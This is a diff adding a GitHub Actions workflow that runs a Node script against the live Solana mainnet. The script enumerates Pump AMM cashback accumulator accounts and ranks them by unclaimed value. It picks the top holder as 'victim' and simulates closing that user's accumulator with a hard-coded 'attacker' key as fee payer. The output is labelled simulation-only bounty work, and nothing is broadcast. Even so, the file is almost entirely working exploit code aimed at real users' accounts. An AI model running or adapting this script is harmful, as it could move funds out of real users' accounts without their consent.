@@ -1,0 +1,47 @@
+name: cashback-accumulator-close-live-probe
+on:
+  push:
+    branches: [audit/boost-runtime-probe-20260815]
+    paths: ['.github/workflows/cashback-accumulator-close-live-probe.yml']
+  workflow_dispatch:
+permissions:
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 12
+    steps:
+      - uses: actions/checkout@v4
+        with: {ref: audit/boost-runtime-probe-20260815}
+      - uses: actions/setup-node@v4
+        with: {node-version: 24}
+      - run: npm install --no-save @pump-fun/pump-swap-sdk@1.19.0 @solana/web3.js @solana/spl-token bs58
+      - shell: bash
+        run: |
+          cat > cashback_close.mjs <<'NODE'
+          import fs from 'node:fs';import bs58pkg from'bs58';
+          import{PublicKey,Transaction}from'@solana/web3.js';
+          import{OFFLINE_PUMP_AMM_PROGRAM,PUMP_AMM_PROGRAM_ID}from'@pump-fun/pump-swap-sdk';
+          const bs58=bs58pkg.default??bs58pkg,attacker=new PublicKey('HTVZVEQMBsNanubDPTs3CxDAEGNFQHJY8c1441iy2S5r');
+          const RPCS=['https://api.mainnet-beta.solana.com','https://rpc.solanatracker.io/public','https://solana-rpc.publicnode.com','https://solana.public-rpc.com'];let id=1;const sleep=ms=>new Promise(r=>setTimeout(r,ms));
+          async function one(u,m,p,n=4){let e;for(let a=0;a<n;a++){try{const r=await fetch(u,{method:'POST',headers:{'content-type':'application/json','user-agent':'pump-authorized-bounty-simulation-only/1.0'},body:JSON.stringify({jsonrpc:'2.0',id:id++,method:m,params:p})});if(r.status===429||r.status>=500){e=new Error('HTTP '+r.status);await sleep(400+600*a);continue}const x=await r.json();if(x.error){e=new Error(JSON.stringify(x.error));if(/No response|429|Too many/i.test(String(e))){await sleep(400+600*a);continue}throw e}return x.result}catch(x){e=x;await sleep(400+600*a)}}throw e}
+          async function call(m,p){let e;for(const u of RPCS){try{return await one(u,m,p)}catch(x){e=x;console.log('RPC_FAIL',m,u,String(x).slice(0,170))}}throw e}
+          async function sim(raw,addresses,label){let e;for(const u of RPCS){try{console.log(label,'SIM_TRY',u);const x=await one(u,'simulateTransaction',[raw.toString('base64'),{encoding:'base64',sigVerify:false,replaceRecentBlockhash:true,commitment:'confirmed',accounts:{encoding:'base64',addresses}}],3);console.log(label,'SIM_RPC',u);return x.value}catch(x){e=x;console.log(label,'SIM_FAIL',u,String(x).slice(0,220))}}throw e}
+          const idl=JSON.parse(fs.readFileSync('node_modules/@pump-fun/pump-swap-sdk/src/idl/pump_amm.json','utf8'));
+          for(const n of ['close_user_volume_accumulator','claim_cashback','sync_user_volume_accumulator']){const x=idl.instructions.find(i=>i.name.toLowerCase()===n);console.log('IDL_'+n.toUpperCase(),JSON.stringify(x,null,2))}
+          const accDef=idl.accounts.find(x=>x.name.toLowerCase()==='uservolumeaccumulator');console.log('ACC_DEF',JSON.stringify(accDef));
+          const disc58=bs58.encode(Buffer.from(accDef.discriminator));
+          const rows=await call('getProgramAccounts',[PUMP_AMM_PROGRAM_ID.toBase58(),{commitment:'confirmed',encoding:'base64',filters:[{memcmp:{offset:0,bytes:disc58}}]}]);
+          console.log('ACCUMULATOR_COUNT',rows.length);
+          const decoded=[];
+          for(const r of rows.slice(0,5000)){try{const b=Buffer.from(r.account.data[0],'base64');const x=OFFLINE_PUMP_AMM_PROGRAM.coder.accounts.decode('userVolumeAccumulator',b);decoded.push({key:r.pubkey,lamports:r.account.lamports,user:x.user.toBase58(),needsClaim:x.needsClaim,totalUnclaimed:x.totalUnclaimedTokens.toString(),totalClaimed:x.totalClaimedTokens.toString(),currentSolVolume:x.currentSolVolume.toString(),lastUpdate:x.lastUpdateTimestamp.toString(),hasTotalClaimed:x.hasTotalClaimedTokens,cashbackEarned:x.cashbackEarned.toString(),totalCashbackClaimed:x.totalCashbackClaimed.toString()})}catch{}}
+          const valuable=decoded.filter(x=>BigInt(x.cashbackEarned)>BigInt(x.totalCashbackClaimed)||BigInt(x.totalUnclaimed)>0n||x.needsClaim).sort((a,b)=>{const av=(BigInt(a.cashbackEarned)-BigInt(a.totalCashbackClaimed))+BigInt(a.totalUnclaimed),bv=(BigInt(b.cashbackEarned)-BigInt(b.totalCashbackClaimed))+BigInt(b.totalUnclaimed);return av>bv?-1:av<bv?1:0});
+          console.log('DECODED',decoded.length,'VALUABLE',valuable.length);console.log('TOP_VALUABLE',JSON.stringify(valuable.slice(0,30),null,2));
+          if(!valuable.length)process.exit(0);
+          const v=valuable[0],victim=new PublicKey(v.user),acc=new PublicKey(v.key);
+          const ix=await OFFLINE_PUMP_AMM_PROGRAM.methods.closeUserVolumeAccumulator().accountsPartial({user:victim}).instruction();console.log('CLOSE_KEYS',ix.keys.map((k,i)=>({i,pubkey:k.pubkey.toBase58(),signer:k.isSigner,writable:k.isWritable})));
+          const bh=(await call('getLatestBlockhash',[{commitment:'confirmed'}])).value;const tx=new Transaction({feePayer:attacker,recentBlockhash:bh.blockhash}).add(ix);const raw=tx.serialize({requireAllSignatures:false,verifySignatures:false});console.log('RAW_BYTES',raw.length,'SIGS',tx.signatures.map(x=>x.publicKey.toBase58()),'VICTIM',v);
+          const out=await sim(raw,[acc.toBase58(),victim.toBase58(),attacker.toBase58()],'CLOSE_VICTIM');const text=(out.logs??[]).join('\n');
+          console.log('CLOSE_RESULT',JSON.stringify({simulationOnly:true,broadcast:false,err:out.err,units:out.unitsConsumed,reached:text.includes('Instruction: CloseUserVolumeAccumulator'),accPost:out.accounts?.[0]?{lamports:out.accounts[0].lamports,owner:out.accounts[0].owner,dataLen:Buffer.from(out.accounts[0].data[0],'base64').length}:null,victimLamportsPost:out.accounts?.[1]?.lamports,attackerLamportsPost:out.accounts?.[2]?.lamports},null,2));console.log('LOGS_BEGIN');for(const l of out.logs??[])console.log(l);console.log('LOGS_END');
+          NODE
+          node cashback_close.mjs
